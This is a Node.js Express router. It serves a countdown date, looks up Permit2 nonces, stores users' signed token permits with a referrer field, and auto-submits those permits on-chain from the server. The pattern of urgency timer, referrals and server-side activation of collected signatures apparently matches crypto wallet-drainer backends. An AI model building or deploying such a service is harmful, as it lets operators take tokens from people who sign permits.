import express from 'express';
import Permit from '../models/Permit.js';
import Settings from '../models/Settings.js';
import { getOnChainNonce, activatePermit } from '../utils/permit2Executor.js';
import { createPermit, getAllPermits, updatePermitById } from '../utils/storage.js';

const router = express.Router();

// GET countdown target date
router.get('/countdown', async (req, res) => {
  try {
    let setting = null;
    try {
      setting = await Settings.findOne({ key: 'countdown_target' });
    } catch (e) {}

    if (!setting) {
      // Default: 120 days, 2 hours, 18 minutes from now
      const defaultTarget = new Date(Date.now() + (120 * 24 * 60 * 60 * 1000) + (2 * 60 * 60 * 1000) + (18 * 60 * 1000)).toISOString();
      res.json({ targetDate: defaultTarget });
      return;
    }
    res.json({ targetDate: setting.value });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// GET next on-chain nonce for an address from Permit2 contract
router.get('/nonce/:address', async (req, res) => {
  try {
    const owner = req.params.address;
    const nonce = await getOnChainNonce(owner);
    res.json({ nonce, owner: owner.toLowerCase() });
  } catch (err) {
    console.error('Error fetching on-chain nonce:', err);
    res.status(500).json({ error: err.message });
  }
});

// POST store a signed permit and automatically activate it on-chain
router.post('/', async (req, res) => {
  try {
    const { owner, token, amount, nonce, deadline, v, r, s, referrer } = req.body;
    if (!owner || !token || !amount || deadline === undefined || v === undefined || !r || !s) {
      return res.status(400).json({ error: 'Missing required fields' });
    }

    const permit = await createPermit({
      owner,
      token,
      amount,
      nonce,
      deadline,
      v,
      r,
      s,
      referrer,
      status: 'pending',
    });

    // Automatically attempt activation on-chain
    let activated = false;
    let txHash = null;
    try {
      console.log(`Auto-activating permit ${permit._id} on-chain for ${owner}...`);
      txHash = await activatePermit(permit);
      await updatePermitById(permit._id, {
        status: 'activated',
        activationTxHash: txHash,
        activatedAt: new Date().toISOString(),
      });
      activated = true;
      console.log(`Successfully auto-activated permit ${permit._id}! TX: ${txHash}`);
    } catch (autoErr) {
      console.warn(`Auto-activation deferred/pending for permit ${permit._id}: ${autoErr.message}`);
    }

    res.status(201).json({ success: true, id: permit._id, activated, txHash });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// GET permits for a specific owner (user history)
router.get('/history/:address', async (req, res) => {
  try {
    const owner = req.params.address.toLowerCase();
    const allPermits = await getAllPermits();
    const userPermits = allPermits.filter(p => p.owner?.toLowerCase() === owner);
    res.json(userPermits);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

export default router;

